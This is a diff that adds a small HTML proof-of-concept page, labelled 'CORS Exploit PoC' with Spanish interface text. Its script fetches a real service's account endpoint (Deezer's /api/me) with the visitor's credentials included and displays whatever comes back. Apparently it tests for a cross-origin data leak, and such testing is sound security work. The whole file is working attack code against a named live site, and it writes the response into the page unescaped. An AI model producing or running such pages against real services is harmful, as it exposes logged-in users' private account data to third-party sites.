@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>🔍 CORS Exploit Test</h2>
+  <p>Abre la consola (F12) para ver los resultados.</p>
+  <script>
+    fetch("https://www.deezer.com/api/me", {
+      credentials: "include"
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log("✅ Datos recibidos desde Deezer:");
+      console.log(data);
+      document.body.innerHTML += "<pre>" + data + "</pre>";
+    })
+    .catch(error => {
+      console.log("❌ Error:", error);
+      document.body.innerHTML += "<p style='color:red;'>❌ Error al acceder a la API de Deezer.</p>";
+    });
+  </script>
+</body>
+</html>
